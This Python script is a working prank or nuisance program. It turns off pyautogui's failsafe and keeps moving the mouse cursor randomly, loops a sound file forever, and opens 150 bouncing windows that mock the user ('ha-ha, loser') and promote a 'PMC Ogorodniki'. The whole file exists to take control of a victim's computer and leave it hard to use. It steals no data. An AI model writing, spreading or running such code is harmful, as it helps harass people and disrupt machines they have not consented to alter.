import pyautogui as pag
from random import randint
from time import sleep
import tkinter as tk
import pyaudio
import wave
import threading
import pkg_resources

pag.FAILSAFE = False


def play_audio():
    while True:
        chunk = 1024
        sound = pkg_resources.resource_filename("__main__", "wouea.wav")
        wf = wave.open(sound, 'rb')
        p = pyaudio.PyAudio()
        stream = p.open(
            format=p.get_format_from_width(wf.getsampwidth()),
            channels=wf.getnchannels(),
            rate=wf.getframerate(),
            output=True
        )
        data = wf.readframes(chunk)
        while data:
            stream.write(data)
            data = wf.readframes(chunk)
        stream.stop_stream()
        stream.close()
        p.terminate()


def mouse():
    while True:
        x = randint(1, 1920)
        y = randint(1, 1080)
        pag.moveTo(x, y)
        sleep(0.1)


def move(root):
    x = randint(1, 1500)
    y = randint(1, 800)
    dx = randint(1, 10)
    dy = randint(1, 10)
    vxplus = 1
    vyplus = 1
    while True:
        if vxplus:
            x += dx
        else:
            x -= dx
        if vyplus:
            y += dy
        else:
            y -= dy
        if x > 1600:
            vxplus = 0
        elif x < 10:
            vxplus = 1
        if y > 800:
            vyplus = 0
        elif y < 10:
            vyplus = 1
        root.geometry(f'+{x}+{y}')
        sleep(0.008)


def create_window():
    root = tk.Tk()
    icon = pkg_resources.resource_filename("__main__", "ico.ico")

    root.iconbitmap(icon)
    root.title("Ха-ха лох")
    text_label = tk.Label(root, text="ВСТУПАЙТЕ В \nЧВК ОГОРОДНИКИ", fg="red", background="black", padx=10, pady=10,
                          takefocus=1)
    text_label.config(font=("Courier", 44))
    text_label.pack()
    thread = threading.Thread(target=move, args=(root,))
    root.geometry(f'+{randint(1, 1500)}+{randint(1, 800)}')
    thread.start()
    root.mainloop()


if __name__ == "__main__":

    thread1 = threading.Thread(target=mouse)
    thread2 = threading.Thread(target=play_audio)

    thread1.start()
    thread2.start()
    l = []
    for i in range(150):
        l.append(threading.Thread(target=create_window))
        l[i].start()
        sleep(0.2)

    thread1.join()
    thread2.join()
